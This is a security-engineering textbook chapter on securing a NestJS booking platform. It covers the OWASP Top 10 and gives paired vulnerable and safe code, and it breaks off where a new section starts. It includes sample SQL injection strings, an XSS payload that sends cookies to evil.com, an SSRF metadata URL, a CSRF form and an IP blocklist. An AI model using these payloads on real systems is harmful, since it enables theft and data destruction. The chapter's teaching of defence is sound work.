# Part 7: Security & Compliance

---

# Chapter 27: Security Architecture — Thinking Like an Attacker

## You Already Lock the Front Door

You know how to hash a password with `bcrypt`. You know that HTTPS encrypts traffic between the browser and the server. Good. That puts you ahead of a surprising number of developers who ship production code with passwords stored in plaintext and APIs served over bare HTTP.

But here is the uncomfortable truth: hashing passwords and enabling HTTPS is like locking the front door of your house and calling it a day. A determined burglar does not use the front door. They try the windows. They check the garage. They look for the spare key under the mat. They might even come in through the neighbor's adjoining wall.

Security in a distributed booking system that processes 100,000 bookings per minute works differently from security in a weekend side project. You are not defending against one type of attack. You are defending against dozens of attack categories, hundreds of specific techniques, and thousands of automated scanners that probe your system every single day. The attacker only has to find one weakness. You have to get all of them right.

This chapter teaches you how to think like an attacker — so you can build like a defender.

We will walk through every layer of the security stack, from the HTTP headers your browser enforces to the Kubernetes network policies that isolate your pods. By the end, you will have a complete, production-grade NestJS security module that you understand line by line, and you will know exactly what happens when each layer is missing.

---

## The Security Mindset: Three Principles That Change Everything

Before we write a single line of security code, we need to internalize three principles. These are not suggestions. They are the foundation of every security decision we will make in this chapter and every chapter that follows.

### Principle 1: Defense in Depth

> **Analogy:** Picture a medieval castle. The outer wall is tall and thick — that is your HTTPS layer. But inside, there is a moat (rate limiting), a gatehouse with guards checking papers (authentication and input validation), inner walls separating the keep from the courtyard (network policies), guards at every doorway (authorization checks), and a vault in the deepest chamber with its own lock (encryption at rest). If an attacker breaches the outer wall, they still face the moat. If they cross the moat, the gatehouse stops them. If they bluff past the gatehouse, the inner walls contain them. No single layer is perfect, but together, they make a breach astronomically harder.

**Defense in depth** means you never rely on one protection. You stack them. Every security control assumes the one before it has already failed.

> **Key Term:** **Defense in Depth** — A security strategy that layers multiple independent protections so that the failure of any single layer does not compromise the entire system. If your input validation has a bug, your parameterized queries still prevent SQL injection. If your parameterized queries somehow fail, your database permissions limit the damage. If your database permissions are misconfigured, your network policies prevent the attacker from reaching other services.

Here is how those layers map to our booking platform:

| Layer | What It Does | Technology | Failure Mode Without It |
|-------|-------------|------------|------------------------|
| **Perimeter** | Blocks malicious traffic before it reaches your services | WAF, DDoS protection, CDN | Attackers send crafted payloads directly to your API |
| **Network** | Controls which services can talk to each other | Kubernetes network policies, mTLS | A compromised notification service pivots to your payment service |
| **Transport** | Encrypts data in transit | HTTPS/TLS, mTLS between services | Attackers on the network read passwords and credit card numbers in plaintext |
| **Application** | Validates and sanitizes all input | Helmet.js headers, input validation, CSRF tokens | Injected scripts run in your users' browsers |
| **Authentication** | Verifies identity | JWT, OAuth 2.0, MFA | Anyone can pretend to be any user |
| **Authorization** | Verifies permissions | RBAC, ABAC, policy engines | Authenticated users access data that belongs to other users |
| **Data** | Protects data at rest and in use | Encryption, tokenization, secret management | A database backup leak exposes every credit card number |
| **Monitoring** | Detects breaches after they happen | Audit logs, anomaly detection, SIEM | An attacker lives in your system for months without detection |

We are going to walk through each of these layers. By the end of this chapter, you will have a complete security middleware stack that you understand line by line.

### Principle 2: Least Privilege

> **Analogy:** Think about hotel key cards. When you check into a hotel, your key card opens your room and the gym. It does not open every room on the floor, the staff kitchen, or the hotel safe. Even though the hotel *could* give you a master key, it gives you the minimum access needed for your stay. If your key card is stolen, the thief gets into one room — not the entire hotel.

**Least privilege** means every component — every service, every database user, every API key, every Kubernetes pod — gets the minimum permissions required to do its job. Nothing more.

In our booking system, this looks like:

```typescript
// BAD: One database user with full access
// The booking service connects as 'admin' with ALL privileges
const db = new Pool({
  user: 'admin',           // Can read, write, drop tables, create users
  password: 'admin123',    // Hardcoded. We will fix this later.
  database: 'bookings'
});

// GOOD: Dedicated database user with minimal privileges
// The booking service connects as 'booking_svc' with ONLY what it needs
const db = new Pool({
  user: 'booking_svc',     // Can only SELECT/INSERT/UPDATE on booking tables
  password: await secretManager.getSecret('booking-db-password'),
  database: 'bookings'
});
```

The SQL to create that restricted user:

```sql
-- Create a user with minimal privileges for the booking service
CREATE USER booking_svc WITH PASSWORD 'rotated-by-vault';

-- Grant ONLY the operations the booking service actually needs
GRANT SELECT, INSERT, UPDATE ON bookings, booking_items TO booking_svc;
GRANT SELECT ON rooms, hotels TO booking_svc;
GRANT USAGE ON SEQUENCE bookings_id_seq TO booking_svc;

-- Explicitly DENY dangerous operations
REVOKE DELETE ON bookings FROM booking_svc;           -- Bookings are cancelled, never deleted
REVOKE ALL ON pg_catalog.pg_authid FROM booking_svc;  -- Cannot view other users
REVOKE CREATE ON SCHEMA public FROM booking_svc;      -- Cannot create new tables
```

And here is the same approach using **Prisma** to enforce access patterns at the application level:

```prisma
// prisma/schema.prisma — Booking model with controlled relations
model Booking {
  id          String   @id @default(uuid())
  userId      String   @map("user_id")
  roomId      String   @map("room_id")
  checkIn     DateTime @map("check_in")
  checkOut    DateTime @map("check_out")
  totalAmount Decimal  @map("total_amount") @db.Decimal(10, 2)
  currency    String   @db.VarChar(3)
  status      BookingStatus @default(PENDING)
  createdAt   DateTime @default(now()) @map("created_at")
  updatedAt   DateTime @updatedAt @map("updated_at")

  user        User     @relation(fields: [userId], references: [id])
  room        Room     @relation(fields: [roomId], references: [id])
  payments    Payment[]

  @@map("bookings")
  @@index([userId])
  @@index([roomId, checkIn, checkOut])
}

enum BookingStatus {
  PENDING
  CONFIRMED
  CANCELLED
  COMPLETED
  REFUNDED
}
```

```typescript
// Prisma Client — least privilege through scoped queries
// The service ONLY accesses bookings belonging to the authenticated user
async function getUserBookings(userId: string) {
  return prisma.booking.findMany({
    where: { userId },  // Scoped to this user — cannot see other users' bookings
    select: {
      id: true,
      checkIn: true,
      checkOut: true,
      totalAmount: true,
      status: true,
      room: {
        select: {
          name: true,
          hotel: { select: { name: true, city: true } }
        }
      }
    }
  });
}
```

> **What If You Skip This?** Without least privilege, a SQL injection in your search service gives the attacker `DROP TABLE bookings`. With least privilege, the search service's database user can only `SELECT` — the `DROP TABLE` command fails because the user lacks the permission. You turned a catastrophic breach into a contained incident.

### Principle 3: Zero Trust

Traditional network security works like the walls of a castle: once you are inside, you are trusted. Zero trust says: **never trust, always verify**. Every request must prove its identity and authorization, even if it comes from inside your own network.

> **Key Term:** **Zero Trust** — A security model that requires strict identity verification for every person and every service attempting to access resources, regardless of whether they are inside or outside the network perimeter. The motto: "Never trust, always verify."

In our booking platform, zero trust means:

1. **Service-to-service authentication.** When the Booking Service calls the Payment Service, it presents a cryptographic certificate (via mTLS). The Payment Service verifies it before processing the request. Being "inside the Kubernetes cluster" is not enough.

2. **Token validation on every request.** Even internal services validate JWTs on every call. The API Gateway validates the user's token, but the Booking Service validates it again. If the Gateway is compromised, the Booking Service still rejects forged tokens.

3. **No implicit trust based on network location.** A request from `10.0.0.0/8` (your internal network) gets the same authentication checks as a request from the public internet.

```typescript
// Zero trust: Every service validates the token independently
@Injectable()
export class ZeroTrustGuard implements CanActivate {
  constructor(private readonly jwtService: JwtService) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const token = this.extractToken(request);

    if (!token) {
      throw new UnauthorizedException('No token provided');
    }

    try {
      // Verify signature, expiration, issuer, and audience
      // Even though the API Gateway already did this
      const payload = await this.jwtService.verifyAsync(token, {
        secret: await this.secretManager.getSecret('jwt-public-key'),
        issuer: 'booking-platform',
        audience: 'booking-service',
      });

      // Attach verified user to request
      request.user = payload;
    } catch (error) {
      throw new UnauthorizedException('Invalid token');
    }

    return true;
  }

  private extractToken(request: Request): string | null {
    const [type, token] = request.headers.authorization?.split(' ') ?? [];
    return type === 'Bearer' ? token : null;
  }
}
```

> **Checkpoint:** Can you name the three security principles and give one concrete example of each in our booking system? If you said "defense in depth = layered middleware," "least privilege = restricted database users," and "zero trust = every service validates JWTs independently," you are ready to continue.

---

## The OWASP Top 10: A Systematic Walkthrough

The Open Web Application Security Project (OWASP) publishes a list of the ten most critical web application security risks. This is not academic — it is a ranked list of the ways real-world applications get breached. We are going to walk through each one, show exactly how it applies to our booking system, demonstrate the attack, and then build the defense.

### A01:2021 — Broken Access Control

**What it is:** Users can act outside their intended permissions. They can view other users' bookings, modify prices, or access admin endpoints.

**How it attacks our booking system:**

```typescript
// VULNERABLE: No authorization check — the user ID comes from the URL
@Get('/bookings/:id')
async getBooking(@Param('id') id: string) {
  return this.bookingService.findById(id);  // Returns ANY booking
}

// Attack: User A is logged in. They change the URL from
// /bookings/abc-123 (their booking) to /bookings/xyz-789 (someone else's booking)
// The server happily returns it. This is called an IDOR —
// Insecure Direct Object Reference.
```

**The defense:**

```typescript
// SAFE: Authorization check ensures users can only access their own bookings
@Get('/bookings/:id')
@UseGuards(JwtAuthGuard)
async getBooking(
  @Param('id') id: string,
  @CurrentUser() user: AuthenticatedUser
) {
  const booking = await this.bookingService.findById(id);

  if (!booking) {
    throw new NotFoundException('Booking not found');
  }

  // THE CRITICAL CHECK: Does this booking belong to the requesting user?
  if (booking.userId !== user.id && !user.roles.includes('admin')) {
    // Log the attempt — this might be an attacker probing for valid IDs
    this.logger.warn('Unauthorized booking access attempt', {
      attemptedBookingId: id,
      requestingUserId: user.id,
      bookingOwnerId: booking.userId,
      ip: request.ip,
    });
    throw new ForbiddenException('You do not have access to this booking');
  }

  return booking;
}
```

And the Prisma query that enforces this at the data layer too (defense in depth):

```typescript
// Prisma Client — authorization baked into the query itself
async findUserBooking(bookingId: string, userId: string) {
  const booking = await prisma.booking.findFirst({
    where: {
      id: bookingId,
      userId: userId,  // This WHERE clause means it is IMPOSSIBLE to
                        // return another user's booking
    },
    include: {
      room: { include: { hotel: true } },
      payments: true,
    }
  });

  if (!booking) {
    // Deliberately vague — do not tell the attacker whether the booking
    // exists but belongs to someone else, or does not exist at all
    throw new NotFoundException('Booking not found');
  }

  return booking;
}
```

> **What If You Skip This?** In 2019, a major airline's API had no authorization checks on their booking endpoint. Researchers discovered that by incrementing the booking reference number in the URL, they could view any passenger's booking details — including passport numbers, phone numbers, and flight itineraries. The vulnerability affected millions of passengers. One missing `if` statement.

### A02:2021 — Cryptographic Failures

**What it is:** Sensitive data is not properly protected. Credit card numbers stored in plaintext. Passwords hashed with MD5. Data transmitted over HTTP.

**How it attacks our booking system:**

```typescript
// VULNERABLE: Storing credit card numbers in your database
await prisma.payment.create({
  data: {
    bookingId,
    cardNumber: '4111111111111111',  // NEVER do this
    cvv: '123',                       // ABSOLUTELY NEVER do this
    amount: 299.99,
  }
});

// If your database is breached, every credit card number is exposed.
// You are now liable for PCI DSS violations, fines, and lawsuits.
```

**The defense:**

```typescript
// SAFE: Use a payment processor (Stripe) for tokenization
// Your server NEVER sees the actual card number
import Stripe from 'stripe';

const stripe = new Stripe(
  await secretManager.getSecret('stripe-secret-key')
);

async function processPayment(bookingId: string, paymentMethodId: string) {
  // Stripe handles the card data. You only store a token.
  const paymentIntent = await stripe.paymentIntents.create({
    amount: 29999,  // Amount in cents
    currency: 'usd',
    payment_method: paymentMethodId,  // Token from Stripe.js — NOT a card number
    confirm: true,
    metadata: { bookingId },
  });

  // Store only the token and status — never the card number
  await prisma.payment.create({
    data: {
      bookingId,
      stripePaymentIntentId: paymentIntent.id,  // A token, not a card number
      amount: new Prisma.Decimal(299.99),
      currency: 'usd',
      status: paymentIntent.status,
      // No cardNumber field. No CVV field. They do not exist in our schema.
    }
  });
}
```

The Prisma schema for payments — notice what is NOT there:

```prisma
model Payment {
  id                    String        @id @default(uuid())
  bookingId             String        @map("booking_id")
  stripePaymentIntentId String        @unique @map("stripe_payment_intent_id")
  amount                Decimal       @db.Decimal(10, 2)
  currency              String        @db.VarChar(3)
  status                PaymentStatus @default(PENDING)
  refundedAt            DateTime?     @map("refunded_at")
  createdAt             DateTime      @default(now()) @map("created_at")

  booking               Booking       @relation(fields: [bookingId], references: [id])

  // NO cardNumber field. NO cvv field. NO expiryDate field.
  // If these fields do not exist, they cannot be stolen.

  @@map("payments")
  @@index([bookingId])
}
```

### A03:2021 — Injection

We will cover SQL injection in exhaustive detail in its own section below. For now, know that injection is not limited to SQL. It includes:

- **SQL Injection:** Manipulating database queries
- **NoSQL Injection:** Manipulating MongoDB queries with `$gt`, `$ne` operators
- **Command Injection:** Executing system commands via `child_process.exec()`
- **LDAP Injection:** Manipulating directory service queries
- **Template Injection:** Executing code via template engines (Handlebars, EJS)

The universal defense: **never build commands by concatenating user input.** Use parameterized queries, ORMs, and purpose-built APIs.

### A04:2021 — Insecure Design

**What it is:** Security flaws baked into the architecture itself — not implementation bugs, but missing safeguards that should have been designed in from the start.

**How it attacks our booking system:**

```typescript
// INSECURE DESIGN: No rate limit on password reset
// An attacker can request unlimited password reset emails for any user
@Post('/auth/forgot-password')
async forgotPassword(@Body('email') email: string) {
  const token = crypto.randomBytes(32).toString('hex');
  await this.userService.saveResetToken(email, token);
  await this.emailService.sendResetEmail(email, token);
  return { message: 'If the email exists, a reset link has been sent' };
}

// Attack: An attacker sends 10,000 requests/second to this endpoint
// with a victim's email. The victim's inbox floods. Your email
// service bill skyrockets. And the attacker can time brute-force
// attempts against the reset tokens.
```

**The defense — secure by design:**

```typescript
// SECURE DESIGN: Rate limiting + cooldown + token expiry
@Post('/auth/forgot-password')
@Throttle({ default: { limit: 3, ttl: 900000 } }) // 3 requests per 15 min
async forgotPassword(@Body('email') email: string) {
  // Check cooldown — only one reset email per 5 minutes per email
  const recentReset = await prisma.passwordReset.findFirst({
    where: {
      email,
      createdAt: { gte: new Date(Date.now() - 5 * 60 * 1000) }
    }
  });

  if (recentReset) {
    // Return the SAME success message — do not reveal whether
    // the cooldown triggered or the email does not exist
    return { message: 'If the email exists, a reset link has been sent' };
  }

  const token = crypto.randomBytes(32).toString('hex');
  const hashedToken = await bcrypt.hash(token, 10); // Hash before storing

  await prisma.passwordReset.create({
    data: {
      email,
      tokenHash: hashedToken,          // Store the HASH, not the raw token
      expiresAt: new Date(Date.now() + 30 * 60 * 1000),  // 30-minute expiry
    }
  });

  await this.emailService.sendResetEmail(email, token);
  return { message: 'If the email exists, a reset link has been sent' };
}
```

### A05:2021 — Security Misconfiguration

**What it is:** Default configurations, unnecessary features, overly verbose error messages, missing security headers, or overly permissive CORS settings.

**How it attacks our booking system:**

```typescript
// MISCONFIGURED: Stack traces in production responses
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,           // Tells the attacker your file paths
    query: err.query,           // Tells the attacker your SQL structure
    connectionString: err.cs,   // Tells the attacker your DB credentials
  });
});

// MISCONFIGURED: Default credentials left in production
const redis = new Redis({
  host: 'redis.internal',
  password: '',  // No password. Anyone on the network can connect.
});

// MISCONFIGURED: Debug/diagnostic endpoints exposed
app.get('/debug/env', (req, res) => {
  res.json(process.env);  // Exposes every environment variable
});
```

**The defense:**

```typescript
// SAFE: Production error handler reveals nothing useful to attackers
@Catch()
export class ProductionExceptionFilter implements ExceptionFilter {
  constructor(private readonly logger: Logger) {}

  catch(exception: unknown, host: ArgumentsHost) {
    const ctx = host.switchToHttp();
    const response = ctx.getResponse<Response>();
    const request = ctx.getRequest<Request>();

    const status = exception instanceof HttpException
      ? exception.getStatus()
      : HttpStatus.INTERNAL_SERVER_ERROR;

    // Log the FULL error internally — you need this for debugging
    this.logger.error('Unhandled exception', {
      exception: exception instanceof Error ? exception.stack : exception,
      path: request.url,
      method: request.method,
      userId: request.user?.id,
      requestId: request.headers['x-request-id'],
    });

    // Return a GENERIC message to the client — reveal nothing
    response.status(status).json({
      statusCode: status,
      message: status === 500
        ? 'An internal error occurred'  // No stack trace, no query, no details
        : (exception as HttpException).message,
      timestamp: new Date().toISOString(),
      requestId: request.headers['x-request-id'],  // So support can look it up
    });
  }
}
```

> **What If You Skip This?** In 2017, a major credit reporting agency was breached because they failed to patch a known vulnerability in Apache Struts. The patch had been available for two months. Security misconfiguration — in this case, failing to apply updates — led to the exposure of 147 million people's personal data, including Social Security numbers. The fix took one afternoon. The damage took years.

### A06:2021 — Vulnerable and Outdated Components

**What it is:** Using libraries, frameworks, or dependencies with known vulnerabilities. Every `npm install` adds someone else's code — and someone else's bugs — to your attack surface.

**How it attacks our booking system:**

```bash
# You install a date library for check-in/check-out formatting
npm install moment@2.29.1

# Six months later, a critical prototype pollution vulnerability
# is discovered in that version. Your booking service is now
# vulnerable — not because of YOUR code, but because of code
# you imported and forgot about.
```

**The defense:** We cover dependency scanning in detail below (npm audit, Snyk). The principle is simple: know what you depend on, and keep it updated.

### A07:2021 — Identification and Authentication Failures

**What it is:** Weak passwords, missing MFA, session fixation, credential stuffing.

**How it attacks our booking system:**

```typescript
// VULNERABLE: No brute-force protection on login
@Post('/auth/login')
async login(@Body() dto: LoginDto) {
  const user = await this.userService.findByEmail(dto.email);
  if (!user || !(await bcrypt.compare(dto.password, user.passwordHash))) {
    throw new UnauthorizedException('Invalid credentials');
  }
  return this.issueToken(user);
}
// An attacker tries 10,000 passwords per second against a known email.
// With no rate limit, they will crack weak passwords in minutes.
```

**The defense:**

```typescript
// SAFE: Login with brute-force protection and account lockout
@Post('/auth/login')
@Throttle({ default: { limit: 5, ttl: 60000 } })  // 5 attempts per minute
async login(@Body() dto: LoginDto, @Req() req: Request) {
  // Check if the account is locked
  const lockout = await prisma.loginAttempt.count({
    where: {
      email: dto.email,
      success: false,
      createdAt: { gte: new Date(Date.now() - 15 * 60 * 1000) },
    },
  });

  if (lockout >= 10) {
    this.logger.warn('Account locked due to excessive login failures', {
      email: dto.email,
      ip: req.ip,
    });
    // Same message — do not reveal that the account is locked vs. wrong password
    throw new UnauthorizedException('Invalid credentials');
  }

  const user = await this.userService.findByEmail(dto.email);
  const valid = user && (await bcrypt.compare(dto.password, user.passwordHash));

  // Record the attempt REGARDLESS of success or failure
  await prisma.loginAttempt.create({
    data: {
      email: dto.email,
      ip: req.ip,
      userAgent: req.headers['user-agent'] ?? 'unknown',
      success: !!valid,
    },
  });

  if (!valid) {
    throw new UnauthorizedException('Invalid credentials');
  }

  return this.issueToken(user);
}
```

```prisma
// prisma/schema.prisma — LoginAttempt for brute-force tracking
model LoginAttempt {
  id        String   @id @default(uuid())
  email     String
  ip        String
  userAgent String   @map("user_agent")
  success   Boolean
  createdAt DateTime @default(now()) @map("created_at")

  @@map("login_attempts")
  @@index([email, createdAt])
  @@index([ip, createdAt])
}
```

### A08:2021 — Software and Data Integrity Failures

**What it is:** Code and infrastructure that does not verify the integrity of software updates, CI/CD pipelines, or serialized data.

**How it attacks our booking system:** If an attacker compromises your CI/CD pipeline, they can inject malicious code into your build artifacts. Your booking service deploys the tampered version, and the attacker now has access to every customer's data.

**The defense:** Lock dependency versions, verify checksums, sign your containers, and use `npm ci` (not `npm install`) in CI pipelines.

### A09:2021 — Security Logging and Monitoring Failures

We cover this in exhaustive detail in the Security Logging section below.

### A10:2021 — Server-Side Request Forgery (SSRF)

**What it is:** An attacker tricks your server into making requests to internal resources.

**How it attacks our booking system:**

```typescript
// VULNERABLE: User-controlled URL for hotel image import
@Post('/hotels/import-image')
async importImage(@Body('url') url: string) {
  // The attacker submits: url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  // Your server fetches AWS metadata credentials from the instance role.
  const response = await axios.get(url);
  return response.data;
}
```

**The defense:**

```typescript
// SAFE: URL allowlist and validation
@Post('/hotels/import-image')
async importImage(@Body('url') url: string) {
  const parsed = new URL(url);

  // Block internal IPs and metadata endpoints
  const blocked = ['169.254.169.254', '127.0.0.1', '0.0.0.0', 'localhost',
                   '10.', '172.16.', '192.168.'];
  if (blocked.some(prefix => parsed.hostname.startsWith(prefix))) {
    throw new BadRequestException('Invalid image URL');
  }

  // Only allow HTTPS and specific image hosts
  if (parsed.protocol !== 'https:') {
    throw new BadRequestException('Only HTTPS URLs are allowed');
  }

  const allowedHosts = ['images.unsplash.com', 'cdn.hotels.com'];
  if (!allowedHosts.includes(parsed.hostname)) {
    throw new BadRequestException('Image host not allowed');
  }

  const response = await axios.get(url, {
    maxRedirects: 0,       // Prevent redirect-based SSRF
    timeout: 5000,         // Prevent slow-loris attacks
  });

  return this.processImage(response.data);
}
```

> **Checkpoint:** You have now seen all ten OWASP categories and how each one applies to our booking system. The next four sections go deep on the attacks we see most often: SQL injection, XSS, CSRF, and input validation.

---

## SQL Injection: The Attack That Never Dies

SQL injection has been the number one web application vulnerability for over two decades. It remains in the top three because developers still concatenate user input into SQL strings. Here is how it works, why it works, and how to make it impossible in our booking system.

### The Attack

```typescript
// VULNERABLE: String concatenation builds the SQL query
async searchRooms(city: string, maxPrice: string) {
  const query = `
    SELECT r.id, r.name, r.price, h.name AS hotel_name
    FROM rooms r
    JOIN hotels h ON r.hotel_id = h.id
    WHERE h.city = '${city}'
    AND r.price <= ${maxPrice}
  `;
  const result = await pool.query(query);
  return result.rows;
}

// Normal usage:
// city = "Paris"    maxPrice = "200"
// Query: SELECT ... WHERE h.city = 'Paris' AND r.price <= 200
//
// ATTACK:
// city = "Paris' OR '1'='1' --"    maxPrice = "200"
// Query: SELECT ... WHERE h.city = 'Paris' OR '1'='1' --' AND r.price <= 200
//                                        ^^^^^^^^^^^^          ^^
//                             Always true — returns ALL rooms   Comment — ignores rest
//
// WORSE ATTACK:
// city = "'; DROP TABLE bookings; --"
// Query: SELECT ... WHERE h.city = ''; DROP TABLE bookings; --'
//        Your bookings table is gone. Every booking is deleted.
//
// WORST ATTACK:
// city = "' UNION SELECT username, password_hash, email, '1' FROM users --"
// Query: SELECT r.id, r.name, r.price, h.name FROM rooms r ...
//        UNION SELECT username, password_hash, email, '1' FROM users --
//        The attacker now has every username and password hash in your system.
```

> **Why It Happens:** The database cannot tell the difference between your SQL commands and the attacker's injected SQL because they are all part of the same string. It is like writing a check and leaving the dollar amount blank — whoever picks it up can fill in any number they want.

### The Defense: Parameterized Queries

```typescript
// SAFE: Parameterized queries separate code from data
async searchRooms(city: string, maxPrice: number) {
  const query = `
    SELECT r.id, r.name, r.price, h.name AS hotel_name
    FROM rooms r
    JOIN hotels h ON r.hotel_id = h.id
    WHERE h.city = $1
    AND r.price <= $2
  `;
  // The values are sent SEPARATELY from the query.
  // The database KNOWS $1 and $2 are data, not commands.
  // Even if city = "'; DROP TABLE bookings; --",
  // the database treats it as a literal string search.
  const result = await pool.query(query, [city, maxPrice]);
  return result.rows;
}
```

### The Defense: Prisma (Even Better)

Prisma makes SQL injection essentially impossible for standard operations because you never write SQL. The query builder generates parameterized queries automatically:

```typescript
// Prisma Client — SQL injection is structurally impossible
async searchRooms(city: string, maxPrice: number) {
  return prisma.room.findMany({
    where: {
      hotel: { city },        // Prisma parameterizes this automatically
      price: { lte: maxPrice }, // And this
    },
    select: {
      id: true,
      name: true,
      price: true,
      hotel: { select: { name: true } },
    },
  });
}

// Even if city = "'; DROP TABLE bookings; --",
// Prisma generates: SELECT ... WHERE h.city = $1
// with $1 bound to the literal string "'; DROP TABLE bookings; --"
// The database searches for a city with that exact (ridiculous) name.
// It finds nothing. No injection. No damage.
```

> **Key Insight:** With Prisma, if you ever find yourself using `prisma.$queryRaw` or `prisma.$executeRaw`, stop and think. These bypass Prisma's protections. If you must use them, use tagged template literals which Prisma parameterizes automatically:

```typescript
// SAFE: Prisma's tagged template raw query (parameterized)
const rooms = await prisma.$queryRaw`
  SELECT r.id, r.name, r.price
  FROM rooms r
  JOIN hotels h ON r.hotel_id = h.id
  WHERE h.city = ${city}
  AND r.price <= ${maxPrice}
`;
// Prisma converts ${city} and ${maxPrice} into parameterized values.

// DANGEROUS: String concatenation with raw query (DO NOT DO THIS)
const rooms = await prisma.$queryRawUnsafe(
  `SELECT * FROM rooms WHERE city = '${city}'`  // VULNERABLE
);
```

---

## XSS Prevention: When Your Browser Becomes the Weapon

Cross-Site Scripting (XSS) is an injection attack where the attacker gets your browser to execute their JavaScript. In a booking system, this is especially dangerous because we display user-generated content (review text, guest names, special requests) and send HTML emails with booking confirmations.

> **Key Term:** **Cross-Site Scripting (XSS)** — An attack where malicious scripts are injected into trusted websites. The victim's browser executes the script because it trusts the site, giving the attacker access to cookies, session tokens, and everything the user can see.

### Three Types of XSS

| Type | How It Works | Example in Booking System |
|------|-------------|--------------------------|
| **Stored XSS** | Malicious script saved in your database, served to other users | Attacker writes a "review" containing `<script>` tags. Every user who views the review executes the script. |
| **Reflected XSS** | Malicious script in a URL parameter, reflected back in the response | Search URL: `/search?city=<script>steal(document.cookie)</script>` — the city name is rendered in the page without escaping. |
| **DOM-based XSS** | Malicious script manipulates the page's DOM directly in the browser | Frontend code reads `location.hash` and injects it into `innerHTML` without sanitization. |

### The Attack: Stored XSS in Hotel Reviews

```typescript
// VULNERABLE: Rendering user-generated review HTML without sanitization
@Get('/hotels/:id/reviews')
async getReviews(@Param('id') hotelId: string) {
  const reviews = await prisma.review.findMany({
    where: { hotelId },
  });
  return reviews;  // A review body might contain:
  // "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
  // If the frontend renders this with innerHTML, the script executes.
}
```

### The Defense: Sanitization at Input AND Output

```typescript
// Install: npm install dompurify jsdom isomorphic-dompurify
import DOMPurify from 'isomorphic-dompurify';

// SAFE: Sanitize at input (belt) AND at output (suspenders)
@Post('/hotels/:id/reviews')
@UseGuards(JwtAuthGuard)
async createReview(
  @Param('id') hotelId: string,
  @Body() dto: CreateReviewDto,
  @CurrentUser() user: AuthenticatedUser,
) {
  // BELT: Sanitize at write time — strip all HTML tags
  const sanitizedBody = DOMPurify.sanitize(dto.body, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],  // Only safe formatting
    ALLOWED_ATTR: [],  // No attributes at all — no onclick, no onerror
  });

  return prisma.review.create({
    data: {
      hotelId,
      userId: user.id,
      rating: dto.rating,
      body: sanitizedBody,  // Stored sanitized
    },
  });
}

// SUSPENDERS: Sanitize at read time too — defense in depth
@Get('/hotels/:id/reviews')
async getReviews(@Param('id') hotelId: string) {
  const reviews = await prisma.review.findMany({
    where: { hotelId },
    include: { user: { select: { firstName: true } } },
  });

  return reviews.map(review => ({
    ...review,
    body: DOMPurify.sanitize(review.body, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
      ALLOWED_ATTR: [],
    }),
  }));
}
```

### XSS in Booking Confirmation Emails

This is a subtle attack vector that many teams miss. Booking confirmations are HTML emails — and they often include the guest's name, special requests, and room descriptions. If any of those contain script tags or malicious HTML, the email client might render them.

```typescript
// SAFE: Escape all dynamic content in email templates
import { escape } from 'lodash';

function buildConfirmationEmail(booking: BookingWithDetails): string {
  return `
    <html>
    <body>
      <h1>Booking Confirmed!</h1>
      <p>Dear ${escape(booking.user.firstName)},</p>
      <p>Your booking at <strong>${escape(booking.room.hotel.name)}</strong>
         is confirmed.</p>
      <ul>
        <li>Room: ${escape(booking.room.name)}</li>
        <li>Check-in: ${escape(booking.checkIn.toLocaleDateString())}</li>
        <li>Check-out: ${escape(booking.checkOut.toLocaleDateString())}</li>
        <li>Special Requests: ${escape(booking.specialRequests ?? 'None')}</li>
      </ul>
      <p>Total: ${escape(booking.currency)} ${escape(booking.totalAmount.toString())}</p>
    </body>
    </html>
  `;
}
// escape() converts < to &lt;, > to &gt;, & to &amp;, " to &quot;
// So <script>alert('xss')</script> becomes:
// &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
// Which renders as harmless text, not executable script.
```

---

## CSRF Protection: Stopping Forged Requests

> **Key Term:** **Cross-Site Request Forgery (CSRF)** — An attack where a malicious website tricks a user's browser into making an unwanted request to a site where the user is authenticated. The browser automatically includes the user's cookies, so the server thinks the request is legitimate.

### The Attack

```html
<!-- Attacker's website: evil-deals.com -->
<!-- The user is logged into your booking site in another tab -->
<html>
<body>
  <h1>You won a free vacation!</h1>
  <!-- This hidden form silently submits to YOUR booking API -->
  <form action="https://bookings.example.com/api/bookings" method="POST"
        id="sneaky-form">
    <input type="hidden" name="roomId" value="presidential-suite-id" />
    <input type="hidden" name="checkIn" value="2026-12-25" />
    <input type="hidden" name="checkOut" value="2027-01-01" />
  </form>
  <script>document.getElementById('sneaky-form').submit();</script>
  <!-- The user's browser sends their session cookie automatically.
       The server sees a valid session and creates the booking.
       The user just booked a suite for New Year's without knowing it. -->
</body>
</html>
```

### The Defense: CSRF Tokens + SameSite Cookies

```typescript
// Install: npm install csurf cookie-parser
import * as csurf from 'csurf';
import * as cookieParser from 'cookie-parser';

// main.ts — CSRF protection setup
async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  app.use(cookieParser());

  // CSRF token middleware — generates and validates tokens
  app.use(csurf({
    cookie: {
      httpOnly: true,       // JavaScript cannot read the cookie
      sameSite: 'strict',   // Cookie not sent with cross-origin requests
      secure: true,         // Cookie only sent over HTTPS
    },
  }));

  // Endpoint to get a CSRF token (called by the frontend on page load)
  app.use('/api/csrf-token', (req, res) => {
    res.json({ token: req.csrfToken() });
  });

  await app.listen(3000);
}

// The frontend includes the CSRF token in every state-changing request:
// fetch('/api/bookings', {
//   method: 'POST',
//   headers: {
//     'CSRF-Token': csrfToken,  // From /api/csrf-token
//     'Content-Type': 'application/json',
//   },
//   body: JSON.stringify(bookingData),
// });
```

> **Why This Works:** The attacker's page at evil-deals.com cannot read the CSRF token from your domain (same-origin policy prevents it). Without the token, the forged request is rejected. The `SameSite: strict` cookie attribute provides a second layer — the browser will not send the cookie with cross-origin requests at all.

For APIs that use JWT tokens in the `Authorization` header (not cookies), CSRF is not a concern. The browser does not automatically attach `Authorization` headers to cross-origin requests. However, if you use cookie-based sessions for your web frontend, CSRF protection is mandatory.

---

## Input Validation and Sanitization: The Full NestJS Validation Pipe

Every byte of data that crosses your API boundary is suspect. Validation is not just about catching typos — it is about rejecting payloads that are crafted to exploit your system. NestJS provides a powerful validation pipeline built on `class-validator` and `class-transformer` that we are going to use to build a comprehensive validation layer.

```typescript
